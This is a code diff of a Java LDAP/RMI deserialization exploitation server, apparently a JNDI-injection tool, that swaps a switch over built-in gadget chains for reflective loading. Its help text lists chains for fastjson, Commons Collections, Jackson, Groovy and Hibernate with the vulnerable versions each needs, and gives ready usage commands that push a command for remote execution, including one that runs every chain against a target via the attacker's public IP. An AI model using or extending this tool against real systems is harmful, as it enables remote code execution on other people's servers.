@@ -4,7 +4,6 @@ import com.unboundid.ldap.listener.InMemoryDirectoryServer;
 import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
 import com.unboundid.ldap.listener.InMemoryListenerConfig;
 import org.apache.commons.cli.*;
-import org.gadget.*;
 import org.gadget.inter.Gadget;
 import org.interceptor.SerialOperationInterceptor;
 import org.util.GadgetUtils;
@@ -85,41 +84,24 @@ public class LDAPRefServer {
                 command = command.substring(1, command.length() - 1);
             }
 
-            //判断使用的链子
+            //反射构造使用的内置链
             Gadget gadget = null;
-            switch (gadgetName){
-                case "fastjson":
-                    gadget = new Fastjson();
-                    break;
-                case "CC6":
-                    gadget = new CC6();
-                    break;
-                case "jackson":
-                    gadget = new Jackson();
-                    break;
-                case "jackson2":
-                    gadget = new Jackson2();
-                    break;
-                case "CC4":
-                    gadget = new CC4();
-                    break;
-                case "groovy":
-                    gadget = new Groovy();
-                    break;
-                case "hibernate":
-                    gadget = new Hibernate_ClassPathXmlApplicationContextExec();
-                    break;
-                case "execAll":
+            try{
+                String className = (String)new ArgsBean().getMap().get(gadgetName);
+                if(gadgetName.equals("execAll")){
                     if(!cmd.hasOption("ip") || !cmd.hasOption("rmi")){
                         System.out.println("请查看是否缺少'-ip'及'-rmi'参数");
                         System.exit(0);
                     }
-                    gadget = new ExecAll(ip,ldap_port);
-                    break;
-                default:
-                    System.out.println("暂不支持该链！");
-                    System.exit(0);
+                    gadget = (Gadget)GadgetUtils.getRefObj("org.gadget."+className, new Class[]{String.class,int.class}, new Object[]{ip,ldap_port});
+                }else {
+                    gadget = (Gadget)GadgetUtils.getRefObj("org.gadget."+className);
+                }
+            }catch (Exception e){
+                System.out.println("暂不支持该链！");
+                System.exit(0);
             }
+
             System.out.println("使用"+ gadgetName);
             System.out.println("执行的命令为：" + command);
             if(cmd.hasOption("rmi")){
@@ -138,7 +120,7 @@ public class LDAPRefServer {
                             "低版本动态请求class：\njava -jar LDAPDeserialize-tool.jar -C http://127.0.0.1:8000/1.class\n" +
                             "内置反序列化链：\njava -jar LDAPDeserialize-tool.jar -p 1389 -g fastjson -c \"calc\"\n" +
                             "RMI反序列化打法：\njava -jar LDAPDeserialize-tool.jar -p 1389 -g fastjson -c \"calc\" -rmi\n" +
-                            "RMI内置利用链遍历：\njava -jar LDAPDeserialize-tool.jar -g execAll -c \"calc\" -rmi -ip vps-ip\n" +
+                            "RMI内置利用链遍历：\njava -jar LDAPDeserialize-tool.jar -g execAll -c \"calc\" -rmi -ip 当前服务器公网ip\n" +
                             "\n\n" +
                             "【目前支持的链,*号为支持JDK20+的链】\n" +
                             "fastjson (依赖：1.2.49-1.2.83)\n" +
@@ -149,7 +131,7 @@ public class LDAPRefServer {
                             "groovy (依赖：groovy 2.3.9)\n" +
                             "hibernate (依赖：hibernate 5.x && spring-context && reactor-core)" +
                             "[hibernate为ClassPathXmlApplicationContext执行，'-c'后跟上xml文件WEB地址]\n" +
-                            "execAll (利用链遍历)" +
+                            "execAll (利用链遍历，跑完一次要重新开脚本)" +
                             "\n\n\n"
                     , options);
         }
